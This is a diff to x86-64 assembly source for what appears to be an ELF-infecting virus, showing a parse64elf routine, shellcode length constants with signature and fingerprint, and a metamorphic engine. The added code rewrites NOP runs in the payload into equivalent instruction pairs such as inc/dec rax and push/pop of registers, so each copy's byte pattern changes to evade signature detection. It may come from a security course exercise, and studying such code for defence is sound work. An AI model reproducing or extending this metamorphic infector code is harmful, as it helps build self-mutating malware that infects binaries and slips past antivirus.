@@ -1718,9 +1718,9 @@ push rdx
 	NOP
 retn
 
-%define SHELLCODE_LEN 9321 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
-%define SHELLCODE_JMP_INDEX 9153 ; 44 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 9148 
+%define SHELLCODE_LEN 9447 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
+%define SHELLCODE_JMP_INDEX 9279 ; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 9274 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	NOP
@@ -3069,12 +3069,44 @@ retn
 
 ;void metamorphic(char *code)
 metamorphic: 
+	; \x90\x90\x90\x90\x90\x90 ->  0xc8ff48c0ff48
+	; NOP NOP NOP NOP NOP NOP -> inc rax; dec rax
+	mov rax, 0x60909090909090
+	push rax
+	mov rsi, rsp
 	NOP
 	NOP
 	NOP
 	NOP
 	NOP
 	NOP
+	mov rax, 0x60c8ff48c0ff48 
+	push rax
+	mov rdx, rsp
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	mov rcx, 6
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	mov r10, PURE_SHELLCODE_LEN
+	call ft_str_replace
+	add rsp, 16
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+
+
 	; mov rax, 0 -> xor rax, rax; NOP; NOP
 	mov rax, 0x6000000000b8; mov eax, 0x0
 	push rax
@@ -3095,6 +3127,61 @@ metamorphic:
 	NOP
 	NOP
 	NOP
+	; NOP NOP -> PUSH RAX; POP RAX
+	mov rax, 0x609090
+	push rax
+	mov rsi, rsp
+
+	mov rax, 0x605850
+	push rax
+	mov rdx, rsp
+
+	mov r10, PURE_SHELLCODE_LEN
+	mov rcx, 2
+
+	call ft_str_replace
+	add rsp, 16
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	; NOP NOP -> PUSH RBX; POP RBX
+	mov rax, 0x609090
+	push rax
+	mov rsi, rsp
+
+	mov rax, 0x605b53
+	push rax
+	mov rdx, rsp
+
+	mov r10, PURE_SHELLCODE_LEN
+	mov rcx, 2
+
+	call ft_str_replace
+	add rsp, 16
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	; NOP NOP -> PUSH RCX; POP RCX
+	mov rax, 0x609090
+	push rax
+	mov rsi, rsp
+
+	mov rax, 0x605951
+	push rax
+	mov rdx, rsp
+
+	mov r10, PURE_SHELLCODE_LEN
+	mov rcx, 2
+
+	call ft_str_replace
+	add rsp, 16
+
 	; mov rbx, 0 -> xor rbx, rbx; NOP; NOP
 ;	mov rax, 0x6000000000bb; mov ebx, 0x0
 ;	push rax
@@ -3156,41 +3243,7 @@ metamorphic:
 	NOP
 	NOP
 	NOP
-	; \x90\x90\x90\x90\x90\x90 ->  0xc8ff48c0ff48
-	; NOP NOP NOP NOP NOP NOP -> inc rax; dec rax
-	mov rax, 0x60909090909090
-	push rax
-	mov rsi, rsp
-	NOP
-	NOP
-	NOP
-	NOP
-	NOP
-	NOP
-	mov rax, 0x60c8ff48c0ff48 
-	push rax
-	mov rdx, rsp
-	NOP
-	NOP
-	NOP
-	NOP
-	NOP
-	NOP
-	mov rcx, 6
-	NOP
-	NOP
-	NOP
-	NOP
-	NOP
-	NOP
-	call ft_str_replace
-	add rsp, 16
-	NOP
-	NOP
-	NOP
-	NOP
-	NOP
-	NOP
+
 retn
 
 ;Replaces each occurence of 'to_replace' by 'with' in 'base_str'
